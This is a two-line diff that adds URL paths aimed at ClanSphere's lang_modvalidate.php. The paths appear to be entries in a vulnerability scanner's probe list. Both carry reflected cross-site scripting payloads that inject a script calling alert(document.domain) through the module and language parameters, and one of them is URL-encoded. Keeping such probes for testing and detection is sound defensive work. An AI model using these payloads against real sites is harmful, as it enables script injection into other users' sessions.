@@ -1,0 +1,2 @@
+/mods/clansphere/lang_modvalidate.php?language=language&module=module%22></script><script>alert(document.domain)</script>
+/clansphere/mods/clansphere/lang_modvalidate.php?language=language%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&module=module
